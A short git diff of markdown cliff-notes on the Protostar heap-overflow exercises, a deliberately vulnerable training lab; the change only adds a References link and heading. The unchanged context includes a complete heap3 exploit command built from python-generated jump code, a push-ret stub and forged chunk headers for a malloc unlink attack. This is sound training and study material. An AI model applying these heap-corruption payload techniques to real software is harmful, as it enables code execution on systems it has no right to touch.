@@ -1,6 +1,6 @@
 # Protostar heap-overflow notes
 
-I've noticed that a lot of well documented writeups are present for protostar and decided to instaad post a cliff-notes version for this and upcoming ones.
+I've noticed that a lot of well documented writeups are present for protostar and decided to instaad post a cliff-notes version for this and upcoming ones. A bunch of useful [References](#References)
 
 ### Heap \#0
 Generated good ol' string using pattern_create for 140
@@ -54,4 +54,5 @@ Final Payload:
     
     ./heap3 `python -c 'print "AAAA" + "\xeb\x06" + "\x90"*6 + "\x68\x64\x88\x04\x08\xc3"'` `python -c 'print "B"*16 + "\x01"*4 + "\xff"*4 + "B"*8 + "\xfc\xff\xff\xff" + "\xf0\xff\xff\xff"'` `python -c 'print "CCCC"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'`
 
+## References:
 
